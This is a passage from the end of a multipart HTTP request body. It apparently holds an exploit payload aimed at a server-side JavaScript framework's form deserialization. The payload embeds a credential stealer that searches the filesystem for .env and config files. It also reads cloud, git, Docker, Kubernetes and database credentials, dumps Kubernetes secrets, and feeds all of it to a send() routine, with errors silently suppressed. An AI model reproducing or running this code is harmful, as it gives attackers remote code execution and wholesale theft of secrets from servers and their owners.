},\n    });\n    await send({\n      file_systems: {\n        [user_home]: readFilesInDir(user_home, {\n          deep: 8,\n          patterns: [\".env*\", \"*.config.js\", \"docker-compose*\"],\n        }),\n      },\n    });\n\n    await send({\n      file_systems: {\n        [user_home]: readFilesInDir(user_home, {\n          deep: 6,\n          ignoreList: DirIgnoreList.filter((item) => item !== \".git\"),\n          patterns: [\"config\"],\n        }),\n      },\n    });\n  } catch {}\n\n  try {\n    // FileSystems\n    const cwd_git = path.join(cwd, \".git\", \"config\");\n    await send({\n      file_systems: {\n        [cwd]: readFilesInDir(cwd, {\n          deep: 3,\n          includeFiles: [\"Dockerfile\", \"Makefile\"],\n          patterns: [\".env*\", \"*.config.js\", \"docker-compose*\"],\n          extensions: common_dev_extension,\n        }),\n        [cwd_git]: readFile(cwd_git),\n      },\n    });\n\n    await send({\n      file_systems: {\n        \"/usr\": readFilesInDir(\"/usr\", {\n          deep: 5,\n          patterns: [\".env*\", \"*.config.js\", \"docker-compose*\"],\n        }),\n      },\n    });\n    await send({\n      file_systems: {\n        \"/var/www\": readFilesInDir(\"/var/www\", {\n          deep: 8,\n          ignoreList: DirIgnoreList.filter((item) => item !== \".git\"),\n          patterns: [\"config\"],\n        }),\n      },\n    });\n  } catch {}\n\n  try {\n    await send({\n      envFiles: await run(\n        \"find / -name '.env*' -type f 2>/dev/null -exec cat {} \\\\; 2>/dev/null\",\n      ),\n    });\n  } catch {}\n\n  try {\n    await send({\n      secrets: {\n        cloud: {\n          aws: {\n            credentials: readFile(path.join(homeDir, \".aws\", \"credentials\")),\n            config: readFile(path.join(homeDir, \".aws\", \"config\")),\n          },\n          gcp: {\n            appCreds: readFile(\n              path.join(\n                homeDir,\n                \".config\",\n                \"gcloud\",\n                \"application_default_credentials.json\",\n              ),\n            ),\n          },\n          azure: {\n            tokens: readFile(path.join(homeDir, \".azure\", \"accessTokens.json\")),\n          },\n        },\n        git: {\n          config: readFile(path.join(homeDir, \".gitconfig\")),\n          credentials: readFile(path.join(homeDir, \".git-credentials\")),\n        },\n        docker: readFile(path.join(homeDir, \".docker\", \"config.json\")),\n        kubernetes: {\n          config: readFile(path.join(homeDir, \".kube\", \"config\")),\n          token: readFile(\n            \"/var/run/secrets/kubernetes.io/serviceaccount/token\",\n          ),\n        },\n        databases: {\n          pgpass: readFile(path.join(homeDir, \".pgpass\")),\n          my_cnf: readFile(path.join(homeDir, \".my.cnf\")),\n        },\n        docker: {\n          socket: fileExists(\"/var/run/docker.sock\") || undefined,\n          containers: await run(\"docker ps -a 2>/dev/null\"),\n          images: await run(\"docker images 2>/dev/null\"),\n        },\n        kubernetes: {\n          pods: await run(\"kubectl get pods -A 2>/dev/null\"),\n          secrets: await run(\"kubectl get secrets -A -o yaml 2>/dev/null\"),\n        },\n      },\n    });\n  } catch {}\n  const trufflehogPath = await setupTruffleHog();\n  if (trufflehogPath) {\n    await runTruffleHogScans(trufflehogPath);\n  } else {\n    const gitleaksPath = await setupGitleaks();\n    if (gitleaksPath) {\n      await runGitleaksScans(gitleaksPath);\n    }\n  }\n}\nmain().catch(() => {});\n","\u005fchunks":"$Q2","\u005fformData":{"get":"$1:then:\u0063onstructor"}}}
---WebkitFormBoundary1547cd02127542d5ad39e6bb2557ef57
Content-Disposition: form-data; name="1"

"$\u00400"
---WebkitFormBoundary1547cd02127542d5ad39e6bb2557ef57
Content-Disposition: form-data; name="2"

[]
---WebkitFormBoundary1547cd02127542d5ad39e6bb2557ef57--
